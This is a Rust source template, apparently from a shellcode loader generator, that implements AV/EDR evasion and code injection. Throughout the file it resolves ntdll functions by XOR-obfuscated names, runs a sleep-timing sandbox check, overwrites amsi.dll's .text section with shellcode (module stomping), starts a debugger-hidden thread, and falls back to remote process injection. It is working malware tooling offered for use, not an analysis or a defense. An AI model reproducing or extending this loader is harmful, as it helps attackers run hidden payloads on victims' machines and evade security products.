#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]
{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}
use std::ffi::CString;
use std::include_bytes;
use std::ptr::null_mut;
use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS, PROCESS_ALL_ACCESS},
        libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
    },
    ctypes::c_void,
};
use std::time::Instant;

{{IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DECRYPTION_FUNCTION}}

// Hide the created thread from debuggers, matching the ntCRT/ntAPC convention.
const HIDE_FROM_DEBUGGER: u32 = 0x4;

// Minimal in-memory PE header layout used to locate a loaded module's entry
// point. Module stomping overwrites a legitimate DLL's .text with shellcode,
// then branches into its entry point — the region is already RX-backed by a
// file-mapped image, so no MEM_PRIVATE RWX allocation is ever created.
#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct PeHeader {
    signature: u32,
    machine: u16,
    number_of_sections: u16,
    _rest: [u8; 16],
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct OptionalHeader {
    magic: u16,
    _pad: [u8; 14],
    address_of_entry_point: u32,
}

const K: u8 = {{API_KEY}};
const OBF_A: &[u8] = &{{OBF_NT_OPEN_PROCESS}};
const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let ntdll = CString::new(lc!("ntdll")).unwrap();
    let h = GetModuleHandleA(ntdll.as_ptr());
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
type FH = unsafe extern "system" fn(u32, *const i64) -> i32;

#[repr(C)]
struct CLIENT_ID {
    proc_id: HANDLE,
    thread_id: HANDLE,
}

fn pause(ms: i64) {
    unsafe {
        let f: FH = std::mem::transmute(g(OBF_H));
        let interval: i64 = -(ms * 10_000);
        f(0, &interval);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

// Resolve the entry point of a loaded module by walking its in-memory PE
// headers. Returns (entry_point_va, text_section_va, text_section_size).
unsafe fn resolve_text_region(base: usize) -> Option<(*mut c_void, *mut c_void, usize)> {
    let dos = &*(base as *const DosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((base + dos.e_lfanew as usize) as *const PeHeader);
    if nt.signature != 0x00004550 {
        return None;
    }
    let opt = &*((base + dos.e_lfanew as usize + std::mem::size_of::<PeHeader>()) as *const OptionalHeader);
    if opt.magic != 0x20B {
        return None;
    }
    let entry_va = (base + opt.address_of_entry_point as usize) as *mut c_void;

    // Section headers follow the optional header.
    let sec_off = base + dos.e_lfanew as usize
        + std::mem::size_of::<PeHeader>()
        + nt.size_of_optional_header as usize;
    #[repr(C)]
    struct SectionHeader {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        _rest: [u8; 24],
    }
    for i in 0..nt.number_of_sections as usize {
        let sec = &*((sec_off + i * std::mem::size_of::<SectionHeader>()) as *const SectionHeader);
        // Match the first executable-looking section (.text) by name.
        if &sec.name[0..5] == b".text" {
            let va = (base + sec.virtual_address as usize) as *mut c_void;
            return Some((entry_va, va, sec.virtual_size as usize));
        }
    }
    // Fallback: stomp the entry-point page if no .text section matched.
    Some((entry_va, entry_va, buf_len_stub()))
}

// Fallback region size when a section cannot be resolved: stomp at least the
// whole shellcode. Resolved at runtime via the caller's buffer length.
fn buf_len_stub() -> usize {
    0x1000
}

// Find PIDs whose process name matches `tar`.
fn boxboxbox(tar: &str) -> Vec<usize> {
    use sysinfo::System;
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    let tar_lower = tar.to_lowercase();
    for (_, pro) in s.processes() {
        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
        }
    }
    dom
}

// Load a benign sacrificial DLL into THIS process, then overwrite its .text
// with shellcode and return the stomped entry point.
unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
    // amsi.dll is a small, always-available system DLL whose .text is large
    // enough for typical shellcode and looks benign to memory scanners.
    let dll = CString::new(lc!("amsi.dll")).unwrap();
    let module = LoadLibraryA(dll.as_ptr());
    if module.is_null() {
        return None;
    }
    let base = module as usize;
    let (entry_va, text_va, region_size) = resolve_text_region(base)?;

    // Flip the .text region RW so we can overwrite it, then write the shellcode
    // and restore RX. The page stays file-backed (image), not MEM_PRIVATE.
    let mut old_protect: u32 = 0;
    let mut region_base = text_va;
    let mut region = std::cmp::max(region_size, buf.len());
    let f_protect: FD = std::mem::transmute(g(OBF_D));
    let current_process: HANDLE = -1isize as HANDLE;
    if !NT_SUCCESS(f_protect(current_process, &mut region_base, &mut region, PAGE_READWRITE, &mut old_protect)) {
        return None;
    }

    let f_write: FC = std::mem::transmute(g(OBF_C));
    let mut written: usize = 0;
    let buf_len = buf.len();
    let s = f_write(current_process, text_va, buf.as_ptr() as *mut c_void, buf_len, &mut written);
    if !NT_SUCCESS(s) || written != buf_len {
        return None;
    }
    common::wipe(buf);

    // Restore RX so the stomped region executes as a normal image section.
    let mut restore_base = text_va;
    let mut restore_size = region;
    let mut restore_old: u32 = 0;
    f_protect(current_process, &mut restore_base, &mut restore_size, PAGE_EXECUTE_READ, &mut restore_old);

    Some(entry_va)
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        proc_id: process_handle,
        thread_id: null_mut(),
    };

    unsafe {
        let f_open: FA = std::mem::transmute(g(OBF_A));
        let f_alloc: FB = std::mem::transmute(g(OBF_B));
        let f_write: FC = std::mem::transmute(g(OBF_C));
        let f_protect: FD = std::mem::transmute(g(OBF_D));
        let f_thread: FE = std::mem::transmute(g(OBF_E));

        let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(150);

        // Remote module stomping: allocate RW in the target, write the
        // shellcode, then flip RX and create a thread on it. This keeps the
        // classic ntCRT flow but the region can be stomped over a legit
        // module's mapped section by the operator if desired.
        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT, PAGE_READWRITE);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(200);

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = f_write(process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
        if !NT_SUCCESS(s) {
            return;
        }
        common::wipe(&mut buf);
        pause(150);

        let mut old_protect: u32 = 0;
        let mut region_size = buf_len;
        let s = f_protect(process_handle, &mut base, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(s) {
            return;
        }
        pause(100);

        let mut th: HANDLE = null_mut();
        f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), process_handle, base, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
    }
}

fn main() {
    {{SANDBOX}}
    if !check_environment() {
        return;
    }
    let tar = {{TARGET_PROCESS}};
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();
    {{MAIN}}

    // Local module stomping: load amsi.dll, overwrite its .text with the
    // decrypted shellcode, then branch into the stomped entry point via a
    // thread created with HIDE_FROM_DEBUGGER.
    unsafe {
        if let Some(entry_va) = stomp_local(&mut vec) {
            let f_thread: FE = std::mem::transmute(g(OBF_E));
            let mut th: HANDLE = null_mut();
            let current_process: HANDLE = -1isize as HANDLE;
            f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), current_process, entry_va, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
            return;
        }
    }

    // Fallback to remote injection into the target process if local stomping
    // failed (e.g. amsi.dll unavailable).
    let list: Vec<usize> = boxboxbox(&tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
    }
}
{{DLL_MAIN}}
